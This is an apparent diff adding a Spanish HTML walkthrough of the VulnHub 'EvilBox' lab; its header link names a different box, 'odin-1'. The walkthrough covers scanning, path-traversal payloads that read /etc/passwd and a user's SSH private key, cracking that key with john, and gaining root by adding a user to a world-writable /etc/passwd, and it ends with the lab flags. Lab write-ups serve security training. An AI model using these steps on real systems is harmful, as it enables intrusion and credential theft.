@@ -1,0 +1,152 @@
+I"�"<p><a href="https://www.vulnhub.com/entry/odin-1,619/">https://www.vulnhub.com/entry/odin-1,619//</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una IP con los puertos 80 y 22 abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Al entrar en la web aparecerá la página por defecto de Apache y no se mostrará nada en el código fuente</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Escanear todos los directorios ocultos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> –u 192.168.122.14 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrará el archivo <code class="language-plaintext highlighter-rouge">robots.txt</code> y un directorio llamado <code class="language-plaintext highlighter-rouge">secret</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/5.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a robots.txt, no mostrará nada relevante
+<code class="language-plaintext highlighter-rouge">192.168.122.14/robots.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a secret, no mostrará contenido, sin embargo tampoco mostrará mensaje de error
+<code class="language-plaintext highlighter-rouge">192.168.122.14/secret</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Realizar escaneo de directorios bajo el directorio secret y listando todo lo que termine en html, php o txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> –u 192.168.122.14/secret  <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> html,php,txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/8.png" alt="image-center" class="align-center" /></p>
+
+<p>Aparecerá un nuevo archivo llamado <code class="language-plaintext highlighter-rouge">evil.php</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Al ir de nuevo no mostrará nada, ni si quiera mensaje de error</p>
+
+<p><code class="language-plaintext highlighter-rouge">192.168.122.14/secret/evil.php</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Tratar de fuzzear para intentar ejecutar comandos y de este modo leer el contenido de <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-u</span> <span class="s2">"http://192.168.122.14/secret/evil.php?FUZZ=../../../../../../etc/passwd"</span>  <span class="nt">-w</span> /usr/share/wordlists/fuzz-lfi-params-list.txt <span class="nt">-hw</span> 0
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Aparecerá como resultado que puede usarse command</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a la url añadiendo <code class="language-plaintext highlighter-rouge">?command=../../../../../../etc/passwd</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">192.168.122.14/secret/evil.php?command=../../../../../../etc/passwd</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Inspeccionar el código fuente para que se muestre de forma ordenada</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/14.png" alt="image-center" class="align-center" /></p>
+
+<p>Al observar el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podrá verse un usuario llamado mowree</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/home/mowree/.ssh/id_rsa</code> para buscar la clave privada del usuario</p>
+
+<p>http://192.168.122.14/secret/evil.php?FUZZ=/home/mowree/.ssh/id_rsa</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar la clave privada y guardarla en el equipo atacante</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/17.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/18.png" alt="image-center" class="align-center" /></p>
+
+<p>Convertirlo a hash con la herramienta ssh2john.py y guardarlo en otro archivo nuevo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> id_rsa_hash.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Crackear la contraseña con john</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john id_rsa_hash.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrará la contraseña como resultado</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar por ssh con el usuario mowree y la contraseña encontrada</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mowree@192.168.122.14 <span class="nt">-i</span> id_rsa
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar el contenido del directorio home del usuario mowree y leer el archivo <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/24.png" alt="image-center" class="align-center" /></p>
+
+<p>Al mostrar los permisos de <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podrá verse que tiene permiso de escritura para todos los usuarios</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/25.png" alt="image-center" class="align-center" /></p>
+
+<p>Crear una nuevo usuario con una clave creada en  formato sha-512 desde la maquina atacante</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkpasswd <span class="nt">-m</span> sha-512
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/26.png" alt="image-center" class="align-center" /></p>
+
+<p>Guardarla en un archivo y crear una linea como si de un usuario se tratase, dando permisos de root</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/27.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar este nuevo usuario y ponerlo en el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina victima</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/28.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario nuevo</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/29.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/root</code> y mostrar el contenido de root.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/30.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="flags">Flags</h2>
+
+<p>User: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+
+<p>Root: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+:ET
